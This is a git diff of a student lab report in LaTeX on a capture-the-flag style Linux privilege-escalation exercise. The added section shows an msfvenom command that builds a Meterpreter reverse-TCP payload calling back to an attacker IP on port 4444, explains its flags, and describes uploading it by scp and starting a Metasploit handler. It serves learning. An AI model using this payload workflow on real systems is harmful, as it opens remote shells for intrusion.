@@ -63,7 +63,7 @@ Class:	3AHITN
 
 Name:	Stefan Fürst, Justin Tremurici
 
-Groupname/number Name here/12
+Groupname/number todo/12
 
 Supervisor: 	SPAC, ZIVK
 
@@ -339,11 +339,32 @@ If you want to escalate your privileges on Linux, you have five options, which a
 \subsubsection{checking root proccses}
 \subsubsection{Trying to get privileges using Metasploit and Meterpreter}
 Lastly, we tried to use Meterpreter and its prebuilt privilege escalation modules.\abc
-To do this, we had to generate a payload first. While we could have just used a Netcat shell and upgraded to Meterpreter, we took this opportunity to learn something new. The payload was generated with the following command: \texttt{msfvenom -p linux/x86/meterpreter/reverse\_tcp LHOST=[IP] LPORT=4444 -f elf -o payload.bin}, which is also broken down below.
+To do this, we had to generate a payload first. While we could have just used a Netcat shell and upgraded to Meterpreter, we took this opportunity to learn something new. The payload was generated with the following command: \texttt{msfvenom -p linux/x86/meterpreter/reverse\_tcp LHOST=[IP] LPORT=4444 -f elf -o payload.bin}, which is also broken down below.\cite{msfvenomdocs}
+\begin{lstlisting}[language=bash]
+-p linux/x86/meterpreter/reverse_tcp #setting the payload to be reverse
+                                      #TCP for Linux x86
+LHOST=[IP] # sets IP address of the attacking machine
+LPORT=4444 #sets the local port to listen for a connection
+-f elf #specifies the output format
+-o payload.bin #specifies the output filename
+\end{lstlisting}
+The output of the command can be seen in Figure 28.
+\begin{figure}[h]
+	\includegraphics[scale=0.7]{images/msfgenpayload.png}
+	\centering
+	\caption{Generating the payload using \texttt{msfvenom}}
+\end{figure}\abc
+After this, the payload is uploaded to the target using scp, as demonstrated in Figure 29.
+\begin{figure}[ht]
+	\includegraphics[scale=0.5]{images/scp.png}
+	\centering
+	\caption{Uploading the payload to the target}
+\end{figure}\abc
+The next stop is to open the metasploit console by running \texttt{msfconsole}, setting the exploit to be \texttt{exploiut/multi/handler}
+\newpage
 \subsubsection{trying other common ctf priv escalation ways}
 \subsection{reseting the root password and exploring the vm}
 \subsection{7 flags}
-
 \newpage
 \section{References}
 \bibliography{IEEEabrv,quellen}
